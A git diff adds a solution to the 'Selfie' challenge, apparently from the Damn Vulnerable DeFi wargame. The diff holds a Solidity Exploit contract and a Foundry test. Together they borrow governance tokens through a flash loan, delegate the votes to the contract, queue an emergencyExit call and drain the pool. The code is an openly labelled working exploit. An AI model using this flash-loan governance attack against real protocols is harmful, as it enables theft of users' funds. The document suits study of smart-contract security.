@@ -5,7 +5,7 @@ pragma solidity =0.8.25;
 import {Test, console} from "forge-std/Test.sol";
 import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
 import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
-import {SelfiePool} from "../../src/selfie/SelfiePool.sol";
+import {SelfiePool, IERC3156FlashBorrower} from "../../src/selfie/SelfiePool.sol";
 
 contract SelfieChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -62,7 +62,17 @@ contract SelfieChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_selfie() public checkSolvedByPlayer {
-        
+        // Deploy the exploit contract to take the flash loan
+        Exploit exploit = new Exploit(governance, recovery);
+
+        // Take the maximum flash loan from the Pool and queue an action to call emergencyExit with the recovery address
+        pool.flashLoan(exploit, address(token), pool.maxFlashLoan(address(token)), "");
+
+        // Wait out the action delay
+        vm.warp(block.timestamp + 2 days + 1);
+
+        // Execute the action
+        governance.executeAction(1);
     }
 
     /**
@@ -72,5 +82,37 @@ contract SelfieChallenge is Test {
         // Player has taken all tokens from the pool
         assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
         assertEq(token.balanceOf(recovery), TOKENS_IN_POOL, "Not enough tokens in recovery account");
+    }
+}
+
+contract Exploit is IERC3156FlashBorrower {
+    SimpleGovernance public governance;
+
+    bytes public EMERGENCY_EXIT_CALL;
+
+    bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");
+
+    constructor(SimpleGovernance _governance, address _recovery) {
+        governance = _governance;
+
+        EMERGENCY_EXIT_CALL = abi.encodeWithSignature("emergencyExit(address)", _recovery);
+    }
+
+    function onFlashLoan(address, address token, uint256 amount, uint256, bytes calldata)
+        external
+        override
+        returns (bytes32)
+    {
+        // delegate to yourself
+        DamnValuableVotes(token).delegate(address(this));
+        // queue action to call emnergencyExit with recovery address
+
+        // Set targer as msg.sender, e.g the pool
+        governance.queueAction(msg.sender, 0, EMERGENCY_EXIT_CALL);
+
+        // approve pool to take back the tokens
+        DamnValuableVotes(token).approve(msg.sender, amount);
+
+        return CALLBACK_SUCCESS;
     }
 }
